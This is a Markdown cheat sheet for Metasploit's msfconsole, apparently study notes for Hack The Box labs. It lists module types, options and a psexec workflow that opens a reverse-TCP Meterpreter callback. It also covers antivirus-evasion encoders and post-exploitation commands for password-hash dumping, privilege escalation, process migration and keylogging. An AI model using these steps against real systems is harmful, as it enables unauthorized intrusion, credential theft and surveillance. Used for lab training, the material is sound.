# Metasploit (msfconsole)

Framework for exploitation, recon, post-exploitation, and pivoting.

```bash
sudo msfconsole
```

---

## Core Commands

| Command | Description |
|---|---|
| `search <term>` | Search modules by name/CVE/platform |
| `use <module or number>` | Select a module |
| `options` | Show configurable options |
| `set <OPTION> <value>` | Set an option |
| `setg <OPTION> <value>` | Set globally (persists across modules) |
| `run` / `exploit` | Execute the module |
| `check` | Check if target is vulnerable (if supported) |
| `back` | Exit current module |
| `info` | Detailed info on current module |
| `sessions` | List active sessions |
| `sessions -i <id>` | Interact with a session |

---

## Module Types

| Prefix | Purpose |
|---|---|
| `exploit/` | Exploit a vulnerability, deliver payload |
| `auxiliary/` | Scanning, enumeration, fuzzing — no payload |
| `post/` | Post-exploitation on existing session |
| `payload/` | Code executed on target after exploit |
| `encoder/` | Obfuscate payloads to evade AV |
| `evasion/` | Generate AV-evasive payloads |

---

## Common Options

| Option | Description |
|---|---|
| `RHOSTS` | Target IP(s) / CIDR / file |
| `RPORT` | Target port |
| `LHOST` | Your IP (reverse shell callback) — use `tun0` for HTB |
| `LPORT` | Your listener port (default 4444) |
| `PAYLOAD` | Override default payload |

---

## Workflow Example — psexec (SMB w/ creds)

```
use exploit/windows/smb/psexec
set RHOSTS 10.129.x.x
set SHARE ADMIN$
set SMBUser <user>
set SMBPass <pass>
set LHOST tun0
exploit
```

Default payload: `windows/meterpreter/reverse_tcp`

---

## Payload Naming Convention

`<platform>/<arch>/<type>`

| Type | Separator | Example | Notes |
|---|---|---|---|
| **Staged** | `/` | `windows/meterpreter/reverse_tcp` | Stager calls back for full payload — smaller initial size |
| **Stageless** | `_` | `windows/meterpreter_reverse_tcp` | Full payload in one — no C2 callback needed |

---

## Meterpreter

In-memory DLL injection shell — stealthier than raw TCP reverse shell, more featured than a basic shell.

| Command | Description |
|---|---|
| `?` | List all commands |
| `shell` | Drop into native system shell |
| `upload <file>` | Upload file to target |
| `download <file>` | Download file from target |
| `hashdump` | Dump local password hashes |
| `getuid` | Show current user |
| `getsystem` | Attempt privilege escalation |
| `ps` | List processes |
| `migrate <PID>` | Migrate into another process |
| `keyscan_start` | Start keylogger |
| `background` | Background session, return to msfconsole |
| `sessions -i <id>` | Re-attach to backgrounded session |

---

> Don't rely solely on MSF. Know why exploits fail and when to pivot to manual techniques.
